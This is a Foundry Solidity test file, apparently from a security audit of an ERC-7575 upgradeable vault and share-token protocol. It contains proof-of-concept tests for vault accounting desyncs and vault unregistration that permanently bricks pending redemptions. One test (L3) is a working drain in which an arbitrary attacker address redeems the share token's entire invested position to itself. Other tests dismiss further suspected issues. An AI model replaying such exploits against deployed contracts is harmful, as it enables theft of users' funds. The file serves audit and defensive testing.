// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import {ERC7575VaultUpgradeable} from "../../src/ERC7575VaultUpgradeable.sol";
import {ShareTokenUpgradeable} from "../../src/ShareTokenUpgradeable.sol";
import {WERC7575ShareToken} from "../../src/WERC7575ShareToken.sol";
import {WERC7575Vault} from "../../src/WERC7575Vault.sol";
import {IERC7575Errors} from "../../src/interfaces/IERC7575Errors.sol";
import {MockAsset} from "../MockAsset.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Test} from "forge-std/Test.sol";

/// Setup copied from test/CompleteFlowWalkthrough.t.sol (real WERC7575 investment target).
contract ShareBoundaryTest is Test {
    ERC7575VaultUpgradeable vault;
    ShareTokenUpgradeable shareToken;
    MockAsset asset;
    WERC7575Vault investmentVault;
    WERC7575ShareToken investmentShareToken;

    address owner = makeAddr("owner");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address attacker = makeAddr("attacker");
    address im = makeAddr("investmentManager");
    address validator = makeAddr("validator");

    function setUp() public {
        vm.startPrank(owner);
        asset = new MockAsset();
        investmentShareToken = new WERC7575ShareToken("Investment USD", "iUSD");
        investmentVault = new WERC7575Vault(address(asset), investmentShareToken);
        investmentShareToken.registerVault(address(asset), address(investmentVault));
        investmentShareToken.setValidator(validator);
        investmentShareToken.setKycAdmin(validator);
        investmentShareToken.setRevenueAdmin(validator);

        ShareTokenUpgradeable stImpl = new ShareTokenUpgradeable();
        shareToken = ShareTokenUpgradeable(address(new ERC1967Proxy(address(stImpl),
            abi.encodeWithSelector(ShareTokenUpgradeable.initialize.selector, "S", "S", owner))));
        ERC7575VaultUpgradeable vImpl = new ERC7575VaultUpgradeable();
        vault = ERC7575VaultUpgradeable(address(new ERC1967Proxy(address(vImpl),
            abi.encodeWithSelector(ERC7575VaultUpgradeable.initialize.selector, IERC20(asset), address(shareToken), owner))));
        shareToken.registerVault(address(asset), address(vault));
        shareToken.setInvestmentManager(im);
        shareToken.setInvestmentShareToken(address(investmentShareToken));
        vm.stopPrank();

        vm.prank(validator);
        investmentShareToken.setKycVerified(address(shareToken), true);

        asset.mint(alice, 1_000_000e18);
        asset.mint(bob, 1_000_000e18);
    }

    function _depositAndClaim(address who, uint256 amt) internal returns (uint256 shares) {
        vm.startPrank(who);
        asset.approve(address(vault), amt);
        vault.requestDeposit(amt, who, who);
        vm.stopPrank();
        vm.prank(im);
        vault.fulfillDeposit(who, amt);
        vm.prank(who);
        shares = vault.deposit(amt, who);
    }

    function _selfAllowancePermit() internal {
        address st = address(shareToken);
        uint256 deadline = block.timestamp + 1 hours;
        bytes32 structHash = keccak256(abi.encode(
            keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
            st, st, type(uint256).max, investmentShareToken.nonces(st), deadline));
        bytes32 h = keccak256(abi.encodePacked("\x19\x01", investmentShareToken.DOMAIN_SEPARATOR(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(uint256(keccak256("validator")), h);
        investmentShareToken.permit(st, st, type(uint256).max, deadline, v, r, s);
    }

    // ---------------------------------------------------------------------------------------------
    // L1: activeRedeemRequesters desync. redeem()/withdraw() remove the controller when the CLAIMABLE part is
    // fully claimed, even though a PENDING part remains (partial fulfillment). Same for deposit().
    // ---------------------------------------------------------------------------------------------
    function test_L1_activeRedeemSetDropsControllerWithPendingShares() public {
        uint256 shares = _depositAndClaim(alice, 10_000e18);
        vm.prank(alice);
        vault.requestRedeem(shares, alice, alice);
        vm.prank(im);
        vault.fulfillRedeem(alice, shares / 2);
        vm.prank(alice);
        vault.redeem(shares / 2, alice, alice);

        assertEq(vault.pendingRedeemRequest(0, alice), shares - shares / 2, "alice still has pending redeem");
        assertEq(vault.getActiveRedeemRequesters().length, 0, "but she is no longer an active requester");
        (, uint256 redeemCount) = vault.getActiveRequestersCount();
        assertEq(redeemCount, 0);
    }

    function test_L1_activeDepositSetDropsControllerWithPendingAssets() public {
        vm.startPrank(alice);
        asset.approve(address(vault), 20_000e18);
        vault.requestDeposit(10_000e18, alice, alice);
        vm.stopPrank();
        vm.prank(im);
        vault.fulfillDeposit(alice, 5_000e18);
        vm.prank(alice);
        vault.deposit(5_000e18, alice);
        assertEq(vault.pendingDepositRequest(0, alice), 5_000e18);
        assertEq(vault.getActiveDepositRequesters().length, 0, "pending depositor invisible to IM tooling");
    }

    // ---------------------------------------------------------------------------------------------
    // L2: unregisterVault safety checks rely on the (desynced) active sets and have no pending-redeem-shares total.
    // A vault with outstanding pending redeem shares can be unregistered; afterwards the redeem can never complete
    // because burn() is onlyVaults.
    // ---------------------------------------------------------------------------------------------
    function test_L2_unregisterWithPendingRedeemSharesBricksRedeem() public {
        uint256 shares = _depositAndClaim(alice, 10_000e18);
        vm.prank(alice);
        vault.requestRedeem(shares, alice, alice);
        vm.prank(im);
        vault.fulfillRedeem(alice, shares / 2);
        vm.prank(alice);
        vault.redeem(shares / 2, alice, alice); // desyncs the set (L1)

        // IM invests idle assets so the vault holds 0 asset balance; owner deactivates + unregisters
        uint256 idle = vault.totalAssets();
        vm.prank(im);
        vault.investAssets(idle);
        vm.startPrank(owner);
        vault.setVaultActive(false);
        shareToken.unregisterVault(address(asset)); // passes despite alice's pending redeem shares
        vm.stopPrank();
        assertGt(vault.pendingRedeemRequest(0, alice), 0);

        // later fulfillment succeeds but the claim can never burn -> shares + assets stuck in claimable state
        vm.prank(im);
        vault.fulfillRedeem(alice, shares - shares / 2);
        vm.prank(alice);
        vm.expectRevert(IERC7575Errors.Unauthorized.selector);
        vault.redeem(shares - shares / 2, alice, alice);
    }

    /// Control: had the set been in sync (no partial claim), unregister would have been blocked.
    function test_L2_control_unregisterBlockedWhenSetInSync() public {
        uint256 shares = _depositAndClaim(alice, 10_000e18);
        vm.prank(alice);
        vault.requestRedeem(shares, alice, alice);
        uint256 idle = vault.totalAssets();
        vm.prank(im);
        vault.investAssets(idle);
        vm.startPrank(owner);
        vault.setVaultActive(false);
        vm.expectRevert(IERC7575Errors.CannotUnregisterVaultActiveRedeemRequesters.selector);
        shareToken.unregisterVault(address(asset));
        vm.stopPrank();
    }

    // ---------------------------------------------------------------------------------------------
    // L3 (known root cause, V12 spendSelfAllowance): withdrawFromInvestment REQUIRES the ShareToken to hold a
    // WERC self-allowance, and WERC7575Vault.redeem never checks msg.sender vs owner. So ANY address can redeem the
    // ShareToken's whole investment position to itself. V12 frames the impact as "registered vaults can overspend";
    // this shows the boundary impact: all invested user funds stealable by anyone.
    // ---------------------------------------------------------------------------------------------
    function test_L3_anyoneDrainsShareTokenInvestmentPosition() public {
        _depositAndClaim(alice, 100_000e18);
        vm.prank(im);
        vault.investAssets(100_000e18);
        _selfAllowancePermit(); // required by the protocol's own withdrawFromInvestment flow

        uint256 pos = investmentShareToken.balanceOf(address(shareToken));
        vm.prank(attacker);
        investmentVault.redeem(pos, attacker, address(shareToken));

        assertEq(asset.balanceOf(attacker), 100_000e18, "attacker took all invested assets");
        assertEq(shareToken.getInvestedAssets(), 0);
        // alice's shares are now backed by nothing
        assertEq(vault.convertToAssets(shareToken.balanceOf(alice)) < 1e18, true);
    }

    // ---------------------------------------------------------------------------------------------
    // Dismissal tests
    // ---------------------------------------------------------------------------------------------

    /// D1: donation to a vault while a deposit is pending does not steal from the depositor (value stays fair).
    function test_D1_donationDoesNotStealFromPendingDepositor() public {
        _depositAndClaim(attacker == address(0) ? bob : _fund(attacker), 1_000e18);
        vm.startPrank(alice);
        asset.approve(address(vault), 50_000e18);
        vault.requestDeposit(50_000e18, alice, alice);
        vm.stopPrank();
        asset.mint(attacker, 1_000_000e18);
        vm.prank(attacker);
        asset.transfer(address(vault), 1_000_000e18); // donation
        vm.prank(im);
        vault.fulfillDeposit(alice, 50_000e18);
        vm.prank(alice);
        uint256 s = vault.deposit(50_000e18, alice);
        assertApproxEqRel(vault.convertToAssets(s), 50_000e18, 1e12, "alice's shares worth her deposit");
    }

    function _fund(address who) internal returns (address) {
        asset.mint(who, 1_000_000e18);
        return who;
    }

    /// D2: withdraw() zero-share rounding cannot extract more than the claimable assets and all shares end burned.
    function testFuzz_D2_withdrawRoundingNoExtraction(uint96 yieldAmt, uint8 steps) public {
        uint256 shares = _depositAndClaim(alice, 10_000e18);
        asset.mint(address(vault), bound(uint256(yieldAmt), 1, 50_000e18)); // share price > 1 so shares < assets
        vm.prank(alice);
        vault.requestRedeem(shares, alice, alice);
        vm.prank(im);
        uint256 owed = vault.fulfillRedeem(alice, shares);
        uint256 before = asset.balanceOf(alice);
        uint256 n = bound(steps, 1, 20);
        for (uint256 i; i < n; i++) {
            uint256 left = vault.claimableRedeemRequest(0, alice) == 0 ? 0 : vault.maxWithdraw(alice);
            if (left <= 1) break;
            vm.prank(alice);
            vault.withdraw(1, alice, alice); // tiny withdrawals that may burn 0 shares
        }
        uint256 rest = vault.maxWithdraw(alice);
        if (rest > 0) {
            vm.prank(alice);
            vault.withdraw(rest, alice, alice);
        }
        assertEq(asset.balanceOf(alice) - before, owed, "exactly the owed assets");
        assertEq(shareToken.totalSupply(), 0, "all shares burned");
    }

    /// D3: operators are shared across all vaults of the ShareToken (set via one vault, valid in another).
    /// Documented/central design; logged as QA only.
    function test_D3_operatorSharedAcrossVaults() public {
        vm.prank(alice);
        vault.setOperator(bob, true);
        assertTrue(shareToken.isOperator(alice, bob));
    }

    /// D4: unregistered vault keeps max approval on the ShareToken's investment shares (QA hygiene).
    function test_D4_unregisteredVaultKeepsInvestmentApproval() public {
        vm.startPrank(owner);
        vault.setVaultActive(false);
        shareToken.unregisterVault(address(asset));
        vm.stopPrank();
        assertEq(investmentShareToken.allowance(address(shareToken), address(vault)), type(uint256).max);
    }

    /// D5: a non-vault cannot mint/burn/move shares (mint authority holds).
    function test_D5_onlyVaultsGuards() public {
        vm.startPrank(attacker);
        vm.expectRevert(IERC7575Errors.Unauthorized.selector);
        shareToken.mint(attacker, 1);
        vm.expectRevert(IERC7575Errors.Unauthorized.selector);
        shareToken.vaultTransferFrom(alice, attacker, 1);
        vm.expectRevert(IERC7575Errors.Unauthorized.selector);
        shareToken.setOperatorFor(alice, attacker, true);
        vm.stopPrank();
    }

    /// D6: investment round trip keeps totalNormalizedAssets conserved (WERC shares are 1:1 normalized).
    function test_D6_investmentKeepsNavConserved() public {
        _depositAndClaim(alice, 10_000e18);
        (, uint256 before) = shareToken.getCirculatingSupplyAndAssets();
        vm.prank(im);
        vault.investAssets(7_000e18);
        (, uint256 mid) = shareToken.getCirculatingSupplyAndAssets();
        _selfAllowancePermit();
        vm.prank(im);
        vault.withdrawFromInvestment(7_000e18);
        (, uint256 afterA) = shareToken.getCirculatingSupplyAndAssets();
        assertEq(before, mid);
        assertEq(before, afterA);
    }
}
